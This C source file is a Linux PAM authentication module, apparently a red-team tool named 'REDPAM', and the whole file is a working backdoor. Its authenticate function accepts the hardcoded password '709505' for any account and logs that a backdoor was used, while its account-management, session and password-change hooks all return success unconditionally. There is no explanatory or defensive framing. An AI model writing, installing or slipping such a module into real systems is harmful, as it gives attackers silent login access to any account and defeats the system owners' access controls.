#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <stdio.h>
#include <syslog.h>
#include <string.h>

#define BYPASS_CODE "709505"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *password = NULL;
    int retval;

    retval = pam_get_item(pamh, PAM_AUTHTOK, (const void **)&password);
    if (retval != PAM_SUCCESS) {
        syslog(LOG_AUTH | LOG_ERR, "REDPAM: Unable to retrieve password.");
        return retval;
    }

    if (password == NULL)
        return PAM_AUTH_ERR;

    if (strcmp(password, "709505") == 0) {
        syslog(LOG_AUTH | LOG_INFO, "REDPAM: Uh oh... a backdoor was used...");
        return PAM_SUCCESS;
    }

    return PAM_AUTH_ERR;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;  // No credentials management needed
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;  // No additional account checks
}

PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;  // No session management required
}

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;  // No session cleanup required
}

PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;  // No password change handling
}
